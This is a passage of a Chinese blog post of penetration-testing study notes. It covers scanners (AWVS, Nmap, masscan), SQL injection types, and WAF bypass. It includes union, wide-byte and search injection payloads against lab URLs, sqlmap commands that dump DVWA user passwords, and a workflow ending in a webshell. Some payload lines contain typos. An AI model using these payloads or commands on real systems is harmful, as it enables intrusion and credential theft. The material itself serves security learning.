<h3 id="3-漏洞记录编写"><a href="#3-漏洞记录编写" class="headerlink" title="3.漏洞记录编写"></a>3.漏洞记录编写</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212153145907.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212153253332.png"></p>
<h3 id="4-web应用渗透基本思路"><a href="#4-web应用渗透基本思路" class="headerlink" title="4.web应用渗透基本思路"></a>4.web应用渗透基本思路</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212153456479.png"></p>
<h4 id="1-渗透测试基础案例"><a href="#1-渗透测试基础案例" class="headerlink" title="1.渗透测试基础案例"></a>1.渗透测试基础案例</h4><ol>
<li><p>渗透文章管理系统cms</p>
</li>
<li><p>该网站是一个小型的文章管理系统，开发技术为php+mysql</p>
</li>
<li><p>漏洞扫描，使用avws扫描</p>
</li>
<li><p>分析扫描报告得到该网站的漏洞，比如存在sql漏洞</p>
</li>
<li><p>然后针对于相应的漏洞进行利用，比如，sqlmap获取到网站后台登录账号密码</p>
</li>
<li><p>网站后台登录，寻找文件上传点，一般上传点位于文章的编辑器，头像等，媒体文件上传处</p>
</li>
<li><p>如后台管理处有漏洞，直接使用一句话木马</p>
</li>
<li><p>确认webshell文件路径后，用一句话木马链接菜刀，拿到webshell权限</p>
</li>
</ol>
<h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p>自动化的web漏洞扫描器，审查漏洞如sql注入，xss等其他能够被黑客利用存在的漏洞的网页应用</p>
<h2 id="APPSCAN"><a href="#APPSCAN" class="headerlink" title="APPSCAN"></a>APPSCAN</h2><p>安全扫描工具，具有利用爬虫技术进行网站安全渗透测试的能力</p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212163416007.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212163428593.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212163458310.png"></p>
<p>namp六种状态</p>
<pre class="line-numbers language-none"><code class="language-none">map对端口进行扫描中，当nmap向目标主机发送报文并根据返回报文从而
认定端口的6种状态的含义（注意：这六种状态只是namp认为的端口状态，例如
：有些主机或者防火墙会返回一些不可靠的报文从而妨碍nmap对端口开放问题的
确认）。
Open：端口处于开放状态，例如：当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，
我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们
就认为此端口开放了并且使用了TCP服务。
Closed：端口处于关闭状态。例如：TCP SYN类型的扫描，如果返回RST类型的报文，则端口处
于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端
口，而且，只是在我们扫描的这个时刻为关闭，当我们在另一个时间段进行扫描的时候，这些关闭
的端口可能会处于open的状态。
Filtered（过滤的）：由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要
是由于网络或者主机安装了一些防火墙所导致的。当nmap收到icmp报文主机不可达报文（例如：
type为3，code为13（communication administratively prohibit）报文）或者目标主机无应答
，常常会将目标主机的状态设置为filtered。
Unfiltered（未被过滤的) : 当nmap不能确定端口是否开放的时候所打上的状态，这种状态和
filtered的区别在于：unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的
开放状态，而filtered的端口直接就没就没能够被nmap访问。端口被定义为Unfilterd只会发生在
TCP ack扫描类型时当返回RST的报文。而端口被定义为filtered 状态的原因是是报文被防火墙设备
，路由器规则，或者防火墙软件拦截，无法送达到端口，这通常表现为发送NMAP的主机收到ICMP
报错报文，如：TYPE为3，code为13的报文（通信被认为的禁止communication administratively
prohibited），或者主机通过多次重复发送没有收到任何回应）
Open|filtered状态 : 这种状态主要是nmap无法区别端口处于open状态还是filtered状态。这种
状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin
，和xmas扫描类型。
Closed|filtered状态 : 这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态
只会出现在IP ID idle scan（这个类型我现在也不太理解，需要再进行补充）中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="masscan端口扫描器"><a href="#masscan端口扫描器" class="headerlink" title="masscan端口扫描器"></a>masscan端口扫描器</h2><pre class="line-numbers language-none"><code class="language-none">masscan号称是世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口，
但是这个是由条件的4核电脑，双端口10G网卡。
• masscan相比nmap之所以快很多，masscan采用了异步传输方式，无状态的扫
描方式。nmap需要记录tcp/ip的状态，os能够处理的TCP/IP连接最多为1500左
右。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212163954033.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212164024584.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212164051568.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212164104666.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212164115503.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212164128886.png"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="1-原理-5"><a href="#1-原理-5" class="headerlink" title="1.原理"></a>1.原理</h3><pre class="line-numbers language-none"><code class="language-none"> SQL注入(SQL Injection) 即是指web应用程序对用户输入数据的合法性没有判断或过滤
不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在
管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，
从而进一步得到相应的数据信息。
• 总结：
• 1、是一种将SQL语句插入或添加到应用(用户)的输入参数中的攻击;
• 2、这些参数传递给后台的SQL数据库服务器加以解析并执行;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h3><pre class="line-numbers language-none"><code class="language-none">• 绕过登录验证：使用万能密码登录网站后台等。
• 获取敏感数据：获取网站管理员帐号、密码等。
• 文件系统操作：列目录，读取、写入文件等。
• 注册表操作：读取、写入、删除注册表等。
• 执行系统命令：远程执行命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="3-成因"><a href="#3-成因" class="headerlink" title="3.成因"></a>3.成因</h3><pre class="line-numbers language-none"><code class="language-none">成因可以归结为以下两个原因叠加造成的：
• 1、 程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造 SQL语句 ；
• 2、 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="4-分类"><a href="#4-分类" class="headerlink" title="4.分类"></a>4.分类</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212172621629.png"></p>
<h3 id="5-sql注入测试的方法"><a href="#5-sql注入测试的方法" class="headerlink" title="5.sql注入测试的方法"></a>5.sql注入测试的方法</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212174331969.png"></p>
<h4 id="1-注入点查找"><a href="#1-注入点查找" class="headerlink" title="1.注入点查找"></a>1.注入点查找</h4><p>表单提交，主要是POST请求，也包括GET请求。 • URL参数提交，主要为GET请求参数。 • Cookie参数提交。 • HTTP请求头部可修改的值，比如: • Referer、User_Agent、X-forwarded-for</p>
<h4 id="2-构造测试语句"><a href="#2-构造测试语句" class="headerlink" title="2.构造测试语句"></a>2.构造测试语句</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212174624147.png"></p>
<h3 id="6-手工注入-数字型-amp-字符型"><a href="#6-手工注入-数字型-amp-字符型" class="headerlink" title="6.手工注入-数字型&amp;字符型"></a>6.手工注入-数字型&amp;字符型</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212175836610.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212175852249.png"></p>
<p>总而言之，就是对SQL中的各种类型的输入进行闭合测试， 构造合法SQL，欺骗后台执行！</p>
<h2 id="sql联合查询注入"><a href="#sql联合查询注入" class="headerlink" title="sql联合查询注入"></a>sql联合查询注入</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212180616336.png"></p>
<p>判断列数</p>
<pre class="line-numbers language-none"><code class="language-none"> 当N大于结果集的实际列数时，SQL语句会执行出错，此时SQL语句无法查询到数据，将导致页面显示异常；
Ø 因此我们可以使用ORDER BY语句进行测试，通过逐一增加N的值，当页面显示异常时，可推测出结果集实际列数为N-1；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">1.判断原有查询语句的列数
select company, ordernumber from orders order by 5
2.使原有查询语句的结果为空
http://localhost/sqleasy/news.php?newsid=-1
3.判断数据输出位置
http://localhost/sqleasy/news.php?newsid=-1 union select 1,2,3,4,5
4.使用union语句拼接目标数据的查询语句
http://127.0.0.1/sqltest/search.php?id=-1 union select 1,username,password,3,4, from admin &amp;firstname=&amp;lastname=&amp;city=&amp;year=&amp;btnSign=%E6%9F%A5%E8%AF%A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前提</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212192927677.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193002035.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193013836.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193029219.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193041749.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193058183.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193107959.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193125663.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193141117.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193156262.png"></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-前提"><a href="#1-前提" class="headerlink" title="1.前提"></a>1.前提</h3><pre class="line-numbers language-none"><code class="language-none">利用前提：
页面上没有显示位，但是需要输出SQL语句执行错误信息。比如mysql_error()
优点：
不需要显示位
缺点：
需要输出mysql_error()的报错信<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212193507748.png"></p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="1-原理-6"><a href="#1-原理-6" class="headerlink" title="1.原理"></a>1.原理</h3><p>盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站代码的限制或者apache等 解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一 些方法进行判断或者尝试，这个判断的过程称之为盲注</p>
<h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h3><pre class="line-numbers language-none"><code class="language-none">基于布尔SQL盲注 
基于时间的SQL盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="3-前提"><a href="#3-前提" class="headerlink" title="3.前提"></a>3.前提</h3><pre class="line-numbers language-none"><code class="language-none">利用前提：
页面上没有显示位，也没有输出SQL语句执行错误信息。
只能通过页面返回正常不正常来注入
优点：
不需要显示位，不需要出错信息。
缺点：
速度慢，耗费大量时间。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="4-基于布尔盲注"><a href="#4-基于布尔盲注" class="headerlink" title="4.基于布尔盲注"></a>4.基于布尔盲注</h3><pre class="line-numbers language-none"><code class="language-none">1、没有报错信息
2、不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是0或者1)
3、在正确的输入下，输入and 1=1/and 1=2看返回发现可以判断（只会有真假，没有报错）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212194052530.png"></p>
<h3 id="5-时间盲注"><a href="#5-时间盲注" class="headerlink" title="5.时间盲注"></a>5.时间盲注</h3><h4 id="1-前提-1"><a href="#1-前提-1" class="headerlink" title="1.前提"></a>1.前提</h4><p>利用前提： 页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之 后， 页面的返回速度明显慢了5秒。 优点： 不需要显示位，不需要出错信息。 缺点: 速度慢，耗费大量时间。</p>
<h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p>时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时 语句来构造，由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">1.正常情况下，输入id=1，正常输出为1的信息
2.输入？id=1' 测试页面，发现输入1‘后被转移为\' ，没有信息输出，因为单引号被转移为了\'导致单引号被转移，所以没有闭合
3.输入？d=1%df'测试，丹壹号成功逃逸出转义，闭合成功
4.我们输入“ %df' ”，我们的输入经过 addslashes函数处理 就变成了“%df\'------&gt;%df%5c%27”，在GBK编码的环境下 df 和 5c 会被自动转化成一个汉字“運” 因此语句就变成了（id='1\'--+'---- &gt;id='1運'
5.输入: ?id=1 %df' union select database(),user(),3 --+ 获取数据库名和用户
addslashes()函数返回在预定义字符之前添加反斜杠的字符串预定义字符
• 单引号(')
• 双引号(”)
• 反斜杠(\)
• NULL
%27---------单引号
%20---------空格
%23---------#号
%5c---------\反斜杠<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">base64注入是针对于传递参数被base64加密后的注入点进行注入的
 1.正常传参？id=MQ== 输入id=1的内容
 2. 测试是否存在注入？id=MSBhbmQGMt0X  ?id=msbhbmqgmt0y  and 1=1 和and 1=2看页面变化，发现页面有变化，尝试union注入
 3. 判断列数？id=msbvcm==
 4.确定显示位 ？id=ltewehsfjs==
 5.获取数据库名和用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="sql注入-搜索型注入"><a href="#sql注入-搜索型注入" class="headerlink" title="sql注入-搜索型注入"></a>sql注入-搜索型注入</h2><pre class="line-numbers language-none"><code class="language-none">1.url输入：?name=k%' and 1=1--+ 页面有正常搜索信息输出
2.url输入：?name=k%' and 1=2 --+ 页面没有信息,说明and 后面代码成功被执行
3.url输入：?name=k%' order by 7 --+ 判断列数
4.url输入：?name=我%' union select 1,2,3 --+ 判断显示位 ,得出1,2,3 都是显示位
url输入：?name=我%' union select database(),user(),3 --+ 获取数据库名和用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="sql注入-cookie注入"><a href="#sql注入-cookie注入" class="headerlink" title="sql注入-cookie注入"></a>sql注入-cookie注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提 交了，而一般的注入我们是使用get或者post方式提交。</p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="1-常见参数："><a href="#1-常见参数：" class="headerlink" title="1.常见参数："></a>1.常见参数：</h3><h4 id="1-设置目标url"><a href="#1-设置目标url" class="headerlink" title="1.设置目标url"></a>1.设置目标url</h4><pre class="line-numbers language-none"><code class="language-none">参数：-u /--url
最基本格式 sqlmap -u "http: //www. target.com/index. php?id=1"
参数：-m
从文本中获取多个目标扫描，但是每一行只能有一个url。
基本格式：sqlmap -m urllist. txt
参数：-r
从文件中加载HTTP请求，这样的话 就不需要在去设定cookie, POST数据...... 基本格式: sqlmap -r 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="2-设置回显等级"><a href="#2-设置回显等级" class="headerlink" title="2.设置回显等级"></a>2.设置回显等级</h4><pre class="line-numbers language-none"><code class="language-none">参数：-v 默认为1:
0、只显示python错误以及严重的信息。
1、 同时显示基本信息和警告信息。（默认等级）
2、 同时显示debug信息。
3、 同时显示注入的payload。
4、 同时显示HTTP请求。
5、 同时显示HTTP响应头。
6、 同时显示HTTP响应页<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="3-设置探测等级"><a href="#3-设置探测等级" class="headerlink" title="3.设置探测等级"></a>3.设置探测等级</h4><pre class="line-numbers language-none"><code class="language-none">参数：--level (sqlmap -r 情况下)
共有五个等级，默认为1, sqlmap使用的payload可以在xml/payloads.xml中看
到，自己也可以根据相应的格式添加自己的payload
level&gt;=2的时候就会测试HTTP Cookie
level&gt;=3的时候就会测试HTTP User-Agent/Referer头
level=5的时候会测试HTTP Host
基本格式：sqlmap -r 1.txt --level=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="4-设置HTTP数据包参数："><a href="#4-设置HTTP数据包参数：" class="headerlink" title="4.设置HTTP数据包参数："></a>4.设置HTTP数据包参数：</h4><pre class="line-numbers language-none"><code class="language-none">参数：--data
此参数是把data后面的数据以POST方式提交，当参数是POST提交的时候,但是你有没有抓取
数据包,可以用URL+需要检查的参数。
基本格式：sqlmap -u "http://www.target.com/vuln.php" --data=
"id=1"
参数：--cookie
当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到--cookie参数
中。
基本格式：sqlmap -u "http://www.target.com/vuln.php" --data=
"id=1" --cookie=
"Cookie:
Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID=o64fbvo316lg59njufl2
gfutm4;"
HTTP User-Agents
参数：--user-agent
默认情况下sqlmap的HTTP请求头中的User-Agent值是：sqlmap/1.0-dev- xxxxxxxxx(http://sqlmap.org) 这个时候可以手动指定伪造一个User-Agent. 基本格式：sqlmap -u "http://www.target.com" --level 3 --user-agent=
"aaaaaa" -dbs
参数：-random-agent
会从/usr/share/sqlmap/data/txt中随机产生User-Agent头。
基本格式：sqlmap -u "http://www.target.com" --level 3 -random-agent -dbs
sqlmap检查uesr-agent中的注入点，level&gt;=3才会去检查user-agent头是否存在注入漏洞
HTTP Referer头
参数：-referer
sqlmap可以在请求中伪造HTTP中的referer。当--level参数设定＞=3时,会尝试进行referer注
入。
基本格式：
sqlmap -u "http:/A/vww.target.com/?id=1" --referer=
"http://www.baidu.com"
参数：--delay
可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。
参数：--timeout
可以设定一个http请求超过多少秒判定为超时，默认是30秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-使用sqlmap获取dvwa数据"><a href="#2-使用sqlmap获取dvwa数据" class="headerlink" title="2.使用sqlmap获取dvwa数据"></a>2.使用sqlmap获取dvwa数据</h3><p>（1）设置Brupsuite和浏览器代理； </p>
<p>（2）拦截POST请求内容，并另存为url.txt,此处存放在/etc目录下</p>
<p>（3）判断注入点和数据库类型：root@kali:~# sqlmap -r /etc/url</p>
<p>（4）判断数据库名：root@kali:~# </p>
<p>（5）判断表名：root@kali:~# sqlmap -r /etc/url -D dvwa –tables</p>
<p>（6）判断列名：root@kali:~# sqlmap -r /etc/url -D dvwa -T users –-column</p>
<p>（7）获取user字段信息：root@kali:~# sqlmap -r /etc/url -D dvwa -T users</p>
<p>（8）获取passwor字段信息：root@kali:~# sqlmap -r /etc/url -D dvwa -T users -C password –-dump</p>
<p>（9）获取除系统默认表外的所有数据：root@kali:~# sqlmap -r /etc/url –dump-all –exclude-sysdbs</p>
<h2 id="sql绕过安全狗"><a href="#sql绕过安全狗" class="headerlink" title="sql绕过安全狗"></a>sql绕过安全狗</h2><p>四种方法：</p>
<h3 id="方法一：内链注释正常绕过"><a href="#方法一：内链注释正常绕过" class="headerlink" title="方法一：内链注释正常绕过"></a>方法一：内链注释正常绕过</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212201842250.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212201955859.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202025839.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202052848.png"></p>
<h3 id="方法二：内联反向思维绕过"><a href="#方法二：内联反向思维绕过" class="headerlink" title="方法二：内联反向思维绕过"></a>方法二：内联反向思维绕过</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202249809.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202435931.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202449305.png"></p>
<h3 id="方法三：GET传参绕过："><a href="#方法三：GET传参绕过：" class="headerlink" title="方法三：GET传参绕过："></a>方法三：GET传参绕过：</h3><p>参数名=/<em>&amp;正常参数&amp;参数名字=</em>/</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202907690.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202923647.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212202943073.png"></p>
<h3 id="方法四：url编码-16进制编码绕过"><a href="#方法四：url编码-16进制编码绕过" class="headerlink" title="方法四：url编码+16进制编码绕过"></a>方法四：url编码+16进制编码绕过</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212203052782.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212203103999.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212203114982.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">BigBug</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://bigbug888.github.io/posts/20.html">https://bigbug888.github.io/posts/20.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://bigbug888.github.io" target="_blank">BigBug</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" 